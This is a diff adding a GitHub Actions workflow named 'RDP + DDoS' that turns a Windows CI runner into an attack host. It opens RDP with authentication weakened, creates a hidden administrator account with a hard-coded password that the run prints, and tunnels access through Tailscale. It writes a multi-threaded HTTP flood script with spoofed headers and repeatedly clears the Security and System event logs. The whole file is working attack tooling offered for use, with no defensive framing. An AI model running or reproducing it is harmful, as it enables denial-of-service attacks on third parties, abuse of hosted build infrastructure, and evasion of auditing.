@@ -1,0 +1,68 @@
+name: RDP + DDoS
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Enable RDP
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+
+      - name: Create Admin User (net user)
+        run: |
+          net user Hex0 Hex0#2026 /add /passwordchg:no /expires:never
+          net localgroup Administrators Hex0 /add
+          net localgroup "Remote Desktop Users" Hex0 /add
+          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hex0 /t REG_DWORD /d 0 /f
+
+      - name: Install Tailscale
+        env:
+          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
+        run: |
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\t.msi"
+          Start-Process msiexec -ArgumentList "/i C:\t.msi /quiet /norestart" -Wait
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$env:TAILSCALE_AUTHKEY" --hostname="github-rdp"
+          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+          Write-Host "IP: $ip"
+          Write-Host "User: Hex0"
+          Write-Host "Pass: Hex0#2026"
+          Remove-Item C:\t.msi -Force -ErrorAction SilentlyContinue
+
+      - name: Create DDoS Script
+        run: |
+          $ddos = @'
+          param($Target, $Threads = 100, $Rate = 200)
+          while ($true) {
+            $jobs = @()
+            for ($i = 0; $i -lt $Threads; $i++) {
+              $jobs += Start-Job -ScriptBlock {
+                param($url)
+                $wc = New-Object System.Net.WebClient
+                $rand = [System.Random]::new()
+                $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$($rand.Next(90,120)).0.0.0 Safari/537.36")
+                $wc.Headers.Add("X-Forwarded-For", "$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255)).$($rand.Next(1,255))")
+                try { $wc.DownloadString($url) } catch {}
+              } -ArgumentList $Target
+            }
+            $jobs | Receive-Job -Wait
+            Start-Sleep -Milliseconds (1000 / $Rate)
+          }
+          '@
+          $ddos | Out-File -FilePath "C:\ddos.ps1" -Encoding ASCII
+
+      - name: Keep Alive
+        run: |
+          for ($i = 1; $i -le 360; $i++) {
+            Start-Sleep -Seconds 60
+            if ($i % 30 -eq 0) {
+              wevtutil cl Security -ErrorAction SilentlyContinue
+              wevtutil cl System -ErrorAction SilentlyContinue
+            }
+          }
